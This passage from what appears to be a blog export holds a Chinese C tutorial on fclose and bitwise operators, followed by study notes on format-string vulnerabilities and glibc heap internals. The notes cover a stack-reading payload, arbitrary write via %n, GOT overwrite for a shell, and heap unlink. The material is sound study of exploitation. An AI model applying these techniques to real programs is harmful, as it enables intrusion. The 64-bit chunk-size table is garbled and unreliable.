href=\"#关闭文件fclose函数的用法\" class=\"headerlink\" title=\"关闭文件fclose函数的用法\"></a>关闭文件fclose函数的用法</h4><p>对于文件操作的最后一步，这一步的作用主要是断开程序与文件关联，切断IO数据流，释放文件不在占用，结束文件按操作</p>\n<p>这一步的操作很简单，用fclose函数完成。如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fclose</span><span class=\"params\">( FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>其中fp为第一步fopen时成功打开文件后的文件指针；返回值为整型，如成功关闭则返回0，失败则返回-1</p>\n<p>如果本步骤不执行，前面的读写文件，可能不会有效果。同时，对win7系统之前，如若不执行本步骤，当试图再次修改如移动打开等操作这个文件的时候就会蹦出“无法修改该文件，该文件已经被xxx打开”的提示，这下我们明白是什么原因了！</p>\n<h3 id=\"加一个位运算\"><a href=\"#加一个位运算\" class=\"headerlink\" title=\"加一个位运算\"></a>加一个位运算</h3><p>与其他运算符不同，C语言中位运算，顾名思义，是以数值的二进制位为单位进行操作的，包含&lt;&lt;（左移）、&gt;&gt;（右移）、~（按位取反）、&amp;（按位与）、|（按位或）、^(按位异或) 共六种运算符。</p>\n<table>\n<thead>\n<tr>\n<th>左移运算符   &lt;&lt;</th>\n<th>向左（即高位）移位，右侧补0</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>右移运算符   &gt;&gt;</td>\n<td>向右（即低位）移位，左侧补0</td>\n</tr>\n<tr>\n<td>按位取反     ~</td>\n<td>如名，即0变1,1变0</td>\n</tr>\n<tr>\n<td>按位与      &amp;</td>\n<td>相对应的两个位都为1则为1，反之为0</td>\n</tr>\n<tr>\n<td>按位或      |</td>\n<td>相对应的两个位至少有一个为1即为1，反之为0</td>\n</tr>\n<tr>\n<td>按位异或    ^</td>\n<td>相对应的两个位相同为0，相异（不同）为1</td>\n</tr>\n</tbody></table>\n<p>&lt;&lt;和&gt;&gt;运算符，通过箭头方向可以很好的辨别，分别是C语言位运算符中的左移运算符和右移运算符，如表达式13&lt;&lt;2，它的运算过程为：13的用二进制（四个字节，不考虑符号）表示为，0000 0000 0000 0000 0000 0000 0000 1101，那么向左移两位，右侧补0，则变为0000 0000 0000 0000 0000 0000 0011 0100 换成十进制即变为52，大家可以自行验证。</p>\n<p>同理，再举一个例子，如表达式25&gt;&gt;3，表示25的二进制位向右移三位，由</p>\n<p>0000 0000 0000 0000 0000 0000 0001 1001 变为0000 0000 0000 0000 0000 0000 0000 0011 即十进制3</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a,b;</span><br><span class=\"line\">    a=<span class=\"number\">13</span>&lt;&lt;<span class=\"number\">2</span>;</span><br><span class=\"line\">    b=<span class=\"number\">25</span>&gt;&gt;<span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a=%d,b=%d\\n&quot;</span>,a,b);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"number\">52</span>,b=<span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>移位运算符的作用：</strong></p>\n<p>​    1.左移N位的本质是乘以2的N次方</p>\n<p>​    2.右移N位的本质是除以2的N次方</p>\n<p><strong>&amp;按位与运算符</strong>                </p>\n<p>按位与运算符&amp;，有点和前面学过的逻辑与（&amp;&amp;）运算符类似，只有一个&amp;，都是同为1则为1。不同的是按位相互运算。如3&amp;5，运算过程如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">3</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0011</span></span><br><span class=\"line\"><span class=\"number\">5</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0101</span></span><br><span class=\"line\">&amp; ------------------------------------------</span><br><span class=\"line\">  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0001</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到3&amp;5的结果即十进制1</p>\n<p><strong>按位与运算符的作用:</strong></p>\n<ol>\n<li><p>清零</p>\n<p>我们可以对某一个数与0进行按位与运算，由于两个位都为1才为1，因此最终全部位都变为0，起到清零的作用</p>\n</li>\n<li><p>取指定位</p>\n<p>如某些存储场景下，“第1<del>3位表示xxxx“”，我们需要取出1</del>3位，则可以让原数值与数字7进行按位与运算，得到的结果即是原数值的1~3位的值。</p>\n</li>\n<li><p>判断奇偶</p>\n<p>可以发现，数字的奇偶取决于二进制位的最低一位是1还是0，因此只需要与1按位与运算，判断是1是0即可得知奇偶。</p>\n</li>\n</ol>\n<p><strong>|按位或运算符</strong>                </p>\n<p>|按位或运算符，同样，它也与我们前面学过的逻辑或运算符类似，只有一个竖线表示，作用位，两个对应的二进制位有一个为1结果即为1。如8|7的运算过程可以如下表示：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">8</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"number\">7</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0111</span></span><br><span class=\"line\">&amp; ------------------------------------------</span><br><span class=\"line\">  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">1111</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到最终的二进制结果换算成十进制即为15（并不是单纯8+7得来的哦！）</p>\n<p><strong>按位或运算符的作用：</strong></p>\n<ol>\n<li><p>对一个数字的指定位，置为1</p>\n<p>如“某个数字的第七位”表示开关，原先是0，需要改为1的状态，即可以将这个数字与64按位或，即可得到第七位变为1，其余位的值依旧不变。</p>\n</li>\n</ol>\n<p><strong>^按位异或运算符</strong>                </p>\n<p>^表示按位异或运算符，顾名思义，相异，即不同则为1，反之为0</p>\n<p>例如15和16进行异或运算，运算过程如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">15</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">1111</span></span><br><span class=\"line\"><span class=\"number\">16</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0001</span> <span class=\"number\">0000</span></span><br><span class=\"line\">^ ------------------------------------------</span><br><span class=\"line\">   <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0001</span> <span class=\"number\">1111</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到，经过按位异或运算后，其结果变成十进制应为31，大家务必弄清楚运算过程，然后再上机验证，代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a;</span><br><span class=\"line\">    a=<span class=\"number\">15</span>^<span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a=%d\\n&quot;</span>,a);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>异或运算符的作用</strong></p>\n<p>指定位数的翻转</p>\n<p>如想对某个数字的低4位进行翻转，则可以将这个数字与15（二进制为00001111）进行按位异或运算，既可以将原数字的低四位进行翻转，即高四位不变，低四位0变1,1变0</p>\n<p>与0异或还是原值</p>\n<p>大家可以自行实验，一个数字与0进行异或，结果还是原值</p>\n<p>交换两个数字</p>\n<p>除了之前我们学习交换两个数字需要第三个变量做中介之外，如今可以通过异或运算进行，代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">swap</span><span class=\"params\">(<span class=\"keyword\">int</span> *a,<span class=\"keyword\">int</span> *b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (*a!=*b)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        *a=*a^*b;</span><br><span class=\"line\">        *b=*b^*a;</span><br><span class=\"line\">        *a=*a^*b;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a=<span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> b=<span class=\"number\">5</span>;</span><br><span class=\"line\">    swap(&amp;a,&amp;b);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a=%d b=%d\\n&quot;</span>,a,b);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//a=5 b=5</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>~取反运算符</strong>                </p>\n<p>~取反运算符，是对数值的二进制位进行取反，是第一个单目运算符，因为只有一个运算对象，运算过程是即0变为1,1变为0，非常好理解。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> a=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;~a=%u\\n&quot;</span>,~a);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//~a=4294967294</span></span><br></pre></td></tr></table></figure>\n\n"},{"_content":"```\n 学习日记2\n```\n\n**格式化字符串**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625195611418.png\" alt=\"image-20210625195611418\" style=\"zoom:60%;\" />\n\n**格式化占位符**\n\n格式化字符串中的占位符用于指明输出的参数值如何格式化。\n\n| **字符** | **描述**                                                     |\n| -------- | ------------------------------------------------------------ |\n| n$       | n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。  如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO  C。例：printf(\"%2$d %2$#x; %1$d %1$#x\",16,17) 产生\"17 0x11; 16  0x10\" |\n\n Flags可为0个或多个：\n\n| **字 符** | **描述**                                                     |\n| --------- | :----------------------------------------------------------- |\n| +         | 总是表示有符号数值的'+'或'-'号，缺省情况是忽略正数的符号。仅适用于数值类型。 |\n| 空格      | 使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与'+'同时出现，则空格说明符被忽略。 |\n| -         | 左对齐。缺省情况是右对齐。                                   |\n| #         | 对于'g'与'G'，不删除尾部0以表示精度。对于'f',  'F', 'e', 'E', 'g', 'G', 总是输出小数点。对于'o', 'x', 'X', 在非0数值前分别输出前缀0, 0x, and  0X表示数制。 |\n| 0         | 如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(\"%2d\",  3)输出\" 3\"，printf(\"%02d\",  3)输出\"03\"。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。 |\n\n**格式化占位符**\n\nLength指出浮点型参数或整型参数的长度。可以忽略，或者是下述：\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200440768.png\" alt=\"image-20210625200440768\" style=\"zoom:50%;\" />\n\n**漏洞利用**\n\n- 读取数据 \n\n- - %x\n  - %d\n  - %s\n\n- 写入数据 \n\n- - %n\n\n**读取数据**\n\n**$操作符**\n\n读取一个特定的参数\n\nprintf(\"%3$s\", 1, \"b\", \"c\", 4);\n\n将显示3而不是对应顺序的1。其他例子：\n\n- printf(\"%3$d\",1,2,3);，显示3\n- printf(\"%3$d     %2$d %1$d\",1,2,3);，显示3 2 1\n\n读取栈上第100个dword数据\n\n$ python -c \"print '%100$08x'\" | ./print2\n ffa3cad0\n\n通过$操作符读取任意地址数据！！！\n\n**写入数据**\n\n- 任意地址任意写\n\n- - 任意地址：$控制\n  - 任意值：      %xd通过控制x改变输出的字符个数\n\n- getshell\n\n- - 任意地址任意写------>getshell?\n\n- - 覆盖got表！！！\n\n**AAR和AAW**\n\n- AAR：任意地址读（arbitrary     address read）\n- AAW：任意地址写（arbitrary     address write）\n- 能做到这两点就非常强了，重点是如何拿到shell\n- Q：写哪些地址，写什么值进去，可以劫持控制流？\n- A：GOT表\n\n**GOT表**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200629787.png\" alt=\"image-20210625200629787\" style=\"zoom:50%;\" />\n\n**防御**\n\n- 调用约定 \n\n- - caller将所有参数放在栈上\n  - callee假设所有参数都在栈上\n\n- 漏洞确实存在，假设caller传的参数和callee期望的参数个数不同\n\n- 解决方案：在caller和callee之间做验证     \n\n- - caller一共传了多少参数？ \n\n  - - 编译器在编译阶段可以知道\n\n  - callee使用了多少参数？ \n\n  - - 仅在运行时方可知道\n\n### **Glibc堆分配机制**\n\n**堆的使用**\n\n| **分类**   | **函数**                                              |\n| ---------- | ----------------------------------------------------- |\n| 程序员应用 |                                                       |\n| libc 函数  | malloc(),  realloc(), free(), brk(), mmap(), munmap() |\n| 内核调用   | brk,  mmap, munmap                                    |\n\n**Linux 进程布局**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625200833180.png\" alt=\"image-20210625200833180\" style=\"zoom:50%;\" />\n\n没错！又是它o(*￣▽￣*)ブ！！！\n\n**堆 VS 栈**\n\n- 堆 \n  - 动态分配 \n  - 对象，大缓冲区，结构体... \n\n- 更慢，手动 \n\n- - malloc / calloc /      recalloc / free\n  - new / delete\n\n- 栈\n\n- - 在编译阶段就固定的内存分配\n  - 局部变量，返回地址，函数地址\n\n- 快，自动\n\n- - 编译阶段就完成\n  - 抽象出分配/取消分配的概念\n\n**堆的实现**\n\n不同的堆实现\n\n- dlmalloc\n- ptmalloc (glibc)\n- tcmalloc (Chrome,     replaced)\n- jemalloc     (Firefox/Facebook)\n- nedmalloc\n- Hoard\n\n**glibc的堆实现**\n\nchunk\n 堆的基本单位是一个一个chunk块，chunk的结构如下：\n\n```c++\nstruct malloc_chunk {\n    INTERNAL_SIZE_T    prev_size;     /* Size of previous chunk (if free).  */\n    INTERNAL_SIZE_T    size;          /* Size in bytes, including overhead. */\n    struct malloc_chunk* fd;          /* double links -- used only if free. */\n    struct malloc_chunk* bk;                                                                           / * Only used for large blocks: pointer to next larger size.  */\n    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */\n    struct malloc_chunk* bk_nextsize;\n };\n```\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201205824.png\" alt=\"image-20210625201205824\" style=\"zoom:50%;\" />\n\n**chunk size**\n\n为了执行效率，chunk的长度会进行对齐\n\n- 32bit： （x + 4）对齐到8\n\n| **data size** | **0 ~ 4** | **5 ~ 12** | **13 ~ 20** | **...** | **53 ~ 60** | **61 ~ 68** | **69 ~ 76** | **77 ~ 84** |\n| ------------- | --------- | ---------- | ----------- | ------- | ----------- | ----------- | ----------- | ----------- |\n| chunk  size   | 16        | 16         | 24          | ...     | 64          | 72          | 80          | 88          |\n\n- 64bit： （x + 4）对齐到16\n\n| **data size** | **0 ~ 8** | **9 ~ 24** | **25 ~ 40** | **...** | **105 ~ 120** | **121 ~ 136** | **137 ~ 152** | **153 ~ 168** |\n| ------------- | --------- | ---------- | ----------- | ------- | ------------- | ------------- | ------------- | ------------- |\n| chunk  size   | 32        | 32         | 24          | ...     | 64            | 72            | 80            | 88            |\n\n**In used chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625201332771.png\" alt=\"image-20210625201332771\" style=\"zoom:50%;\" />\n\n- 如果前面的chunk是使用状态，prev_size则属于前一个堆块。\n- prev_in_use表明前一个堆块是否free状态（且不在fastbins内）\n- is_mmaped说明内存来自于mmap()\n- non_main_arena表明该堆块由非主线程分配\n\n**free chunk**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625202247694.png\" alt=\"image-20210625202247694\" style=\"zoom:50%;\" />\n\n如果前面的chunk是空闲状态，prev_size则记录前面chunk的大小。\n\n下一个堆块的prev_size记录本堆块的大小。\n\n其中，size不同于pre_size的是，size中的低三位作为flag。\n\n- 最低位:前一个 chunk         是否正在使用\n- 倒数第二位:当前 chunk     是否是通过 mmap 方式产生的\n- 倒数第三位:这个 chunk     是否属于一个线程的 arena\n  需要注意的是，如果该free chunk落在fastbin中，这些数据将不会被设置。\n\n**chunk**\n\n- 正在被使用的chunk \n\n- - 被程序的数据指针指向\n  - 长度是对于chunk本身是可知的\n  - free()因此得以工作\n\n- free状态的chunk \n\n- - 不再被程序指向\n  - 稍后会被重复使用来回应内存分配\n  - 需要有效的组织管理free  chunk以便于maclloc()来分配\n  - how？\n\n**free chunks的组织管理**\n\n- 链表，通常的，一个链表拥有的chunk长度相同     \n\n- - 需要多个链表\n  - 以管理不同长度的chunk\n  - 单链表或双向链表\n  - 链表被分组为几个BINs\n  - fastbins,unsorted_bin,smallbins,largebins\n\n**Arena(32bit)**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203040407.png\" alt=\"image-20210625203040407\" style=\"zoom:50%;\" />\n\n**Get Arena**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203114779.png\" alt=\"image-20210625203114779\" style=\"zoom:50%;\" />\n\n**fastbin**\n\n管理16bytes-64bytes（64位下为32bytes~128bytes）的chunk的单向链表数据结构，由于需要加速程序执行速度的原因，linux对于fastbin的检查较为松散，因此利用起来也较为方便。\n\n- 单向链表 \n\n- - 特点：快\n  - 释放后的chunk插入fastbin表头\n  - 只使用fd指针，bk指针，pre_size,p bit无效\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203309172.png\" alt=\"image-20210625203309172\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203322743.png\" alt=\"image-20210625203322743\" style=\"zoom:40%;\" />\n\n**unsorted_bin**\n\n- malloc() \n\n- - 如果搜索到unsorted_bin，对它管理的chunk一一处理      \n\n  - - 把chunk归放到small/large  bin（唯一增加small/large bin的地方）\n    - 如果长度刚好满足要求，就返回chunk并结束搜索\n\n- free() \n\n- - 如果free的chunk不能放到fastbin，就放到unsorted_bin。\n\n  - 向前面的空闲的chunk合并 \n\n  - - 通过检查p bit\n\n  - 向后面的空闲的chunk合并 \n\n  - - 通过检查它后一个chunk p       bit\n\n  - 设置fd，bk指针，后一个chunk的prev_size,p  bit\n\n**Small-bins**\n\nsmall-bins特点：\n\n- malloc() \n\n- - 如果找到对应长度的chunk，则直接返回\n\n- free() \n\n- - 不会直接把chunk放进small-bin\n\n- fd/bk被设置 \n\n- - 当chunk从unsorted_bin删除时。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203558989.png\" alt=\"image-20210625203558989\" style=\"zoom:50%;\" />\n\n**Large-bins**\n\n- malloc() \n\n- - 如果large-bin被搜索到 \n\n  - - 寻找满足要求的最小chunk\n    - 或者分裂大chunk，一份返回给用户，一份加入到unsorted_bin\n\n- free() \n\n- - 不会直接放到large-bin\n\n- fd/bk, fd_nextsize/bk_nextsize 被设置 \n\n- - 当其从unsorted_bin删除时。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203631401.png\" alt=\"image-20210625203631401\" style=\"zoom:50%;\" />\n\n**top chunk**\n\n初次malloc()后，没有被分出去的堆。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203756685.png\" alt=\"image-20210625203756685\" style=\"zoom:50%;\" />\n\n**malloc过程**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203823867.png\" alt=\"image-20210625203823867\" style=\"zoom:50%;\" />\n\n- 检查长度是否符合fastbin的范围，如果在其中找到，则     \n\n- - 将其从单链表删除\n  - 更新fd指针\n\n- 检查长度是否符合smallbins的范围，如果在其中找到，则     \n\n- - 从双向链表中删除\n  - 更新fd/bk指针\n\n- 如果尝试分配长度很大的chunk，不直接搜索large-bin，而是进行chunk整理     \n\n- - 把fastbin放到unsorted_bin中\n  - 更新下一个chunk的prev_size和p      bit\n  - 合并空闲堆快\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203848532.png\" alt=\"image-20210625203848532\" style=\"zoom:50%;\" />\n\n- 在unsorted_bin中搜索 \n\n- - 如果last_reminder      cache足够大，就分一块出来\n  - 如果找到合适大小的chunk就返回\n  - 对于搜索的每个chunk，将其按照范围放进small/large      bins\n\n- 更新fd/bk指针\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203902464.png\" alt=\"image-20210625203902464\" style=\"zoom:50%;\" />\n\n- 在small/large中搜索 \n\n- - 在最小的非空small/large      bin中找到足够大的chunk \n\n  - - unlink，split\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203923167.png\" alt=\"image-20210625203923167\" style=\"zoom:50%;\" />\n\n- 从TOP chunk中获取内存 \n\n- - 如果top      chunk足够大，就分一部分出来\n  - 如果没有fastbin就从系统获取内存\n  - 再次整理fastbin和unsorted_bin\n\n**free**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625203941475.png\" alt=\"image-20210625203941475\" style=\"zoom:50%;\" />\n\n- 检查元数据的安全性 \n\n- - e.g. :      ptr->fd->bk == ptr\n\n- 如果大小在fastbin范围内就放到fastbin里面     \n\n- - 更新fastbin，fd\n\n- 合并前一个free状态的chunk \n\n- - unlink\n\n- 合并后一个free状态的chunk \n\n- - unlink，top\n\n**unlink**\n\n- 从链表中删除结点，并更新BK/FD\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204020527.png\" alt=\"image-20210625204020527\" style=\"zoom:50%;\" />\n\n\\#define unlink(p,BK,FD)\n {\n   FD = p -> fd;\n   BK = p -> bk;\n   FD -> bk = BK;\n   BK -> fd = FD;\n }\n\n**什么时候进行unlink**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204048786.png\" alt=\"image-20210625204048786\" style=\"zoom:50%;\" />\n\n- free chunk从双向链表中被取出     \n\n- - 一种情况：与它物理相邻的堆块合并\n  - 另一种情况：回应系统的分配请求\n\n- 如果空闲堆块被损害？\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204119490.png\" alt=\"image-20210625204119490\" style=\"zoom:50%;\" />\n\n**当chunk被unlink时**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204132422.png\" alt=\"image-20210625204132422\" style=\"zoom:50%;\" />\n\n**main_areana 地址**\n\n- 运行时libc基地址\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204159171.png\" alt=\"image-20210625204159171\" style=\"zoom:50%;\" />\n\n编译时确定的main_arena的偏移\n\n![image-20210625204227122](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204227122.png)\n\n运行时main_arena的地址\n\n0xf7e16000 + 0x001BA420= 0xf7fd0420\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204302602.png\" alt=\"image-20210625204302602\" style=\"zoom:50%;\" />\n\n**main_arena内容**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204321373.png\" alt=\"image-20210625204321373\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204358309.png\" alt=\"image-20210625204358309\" style=\"zoom:50%;\" />\n\n- free()和malloc()依赖于元数据(chunk的头部信息)来     \n\n- - 遍历      bins/lists/chunks\n  - 将内存返回给用户\n\n- 但是这些元数据没有很好的保护 \n\n- - 堆溢出，use-after-free\n\n**堆溢出利用**\n\n**Glibc：Chunk In Use**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625204532029.png\" alt=\"image-20210625204532029\" style=\"zoom:50%;\" />\n\n- prev_size 区域 \n\n- - 属于前一个chunk\n  - 如果前一个chunk是free状态（并且不在fastbin）就会被设置\n\n- prev_in_use \n\n- - 